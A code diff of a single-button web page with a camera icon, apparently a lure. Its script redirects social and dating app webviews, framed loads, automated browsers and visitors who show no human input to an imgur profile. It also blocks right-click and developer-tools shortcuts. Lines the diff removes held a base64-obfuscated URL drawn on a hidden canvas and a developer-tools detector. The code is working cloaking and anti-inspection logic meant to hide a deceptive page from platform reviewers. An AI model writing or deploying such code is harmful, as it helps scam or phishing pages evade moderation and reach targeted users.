@@ -27,9 +27,6 @@
       cursor: pointer;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
     }
-    canvas.b {
-      display: none;
-    }
     #loading {
       display: none;
       flex-direction: column;
@@ -53,52 +50,44 @@
   </style>
 </head>
 <body>
-  <button class="btn" onclick="g()">📷</button>
+  <button class="btn" onclick="go()">📷</button>
   <div id="loading">
     ⏳ Loading...
     <div class="loader"></div>
   </div>
-  <canvas class="b" id="bait"></canvas>
 
   <script>
     (() => {
       const u = navigator.userAgent.toLowerCase();
-      const a = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
-      if (a.some(s => u.includes(s)) || window.top !== window.self || navigator.webdriver || navigator.plugins.length === 0 || !navigator.languages) {
-        location.href = "https://imgur.com/user/carlovershub";
-      }
-    })();
+      const bots = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
+      const isBot = bots.some(s => u.includes(s)) || window.top !== window.self || navigator.webdriver;
 
-    (() => {
-      const c = document.getElementById("bait").getContext("2d");
-      c.canvas.width = 300;
-      c.canvas.height = 80;
-      c.font = "20px Arial";
-      c.fillStyle = "#000";
-      const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
-      const p2 = "ZWhiaXhlZQ==";
-      const x = atob(p1 + p2);
-      c.fillText(x, 10, 50);
-    })();
+      let human = false;
 
-    setInterval(() => {
-      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
-        location.href = "https://imgur.com/user/carlovershub";
-      }
-    }, 500);
+      const markHuman = () => human = true;
+      document.addEventListener("mousemove", markHuman, { once: true });
+      document.addEventListener("touchstart", markHuman, { once: true });
+      document.addEventListener("keydown", markHuman, { once: true });
+
+      setTimeout(() => {
+        if (isBot || !human) {
+          location.href = "https://imgur.com/user/carlovershub";
+        }
+      }, 3000);
+    })();
 
     document.addEventListener("contextmenu", e => e.preventDefault());
     document.onkeydown = e => {
       if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
     };
 
-    let i = false;
-    document.addEventListener("mousemove", () => i = true);
-    document.addEventListener("touchstart", () => i = true);
-    document.addEventListener("keypress", () => i = true);
+    let interacted = false;
+    document.addEventListener("mousemove", () => interacted = true);
+    document.addEventListener("touchstart", () => interacted = true);
+    document.addEventListener("keypress", () => interacted = true);
 
-    function g() {
-      if (!i) return;
+    function go() {
+      if (!interacted) return;
 
       document.querySelector(".btn").style.display = "none";
       document.getElementById("loading").style.display = "flex";
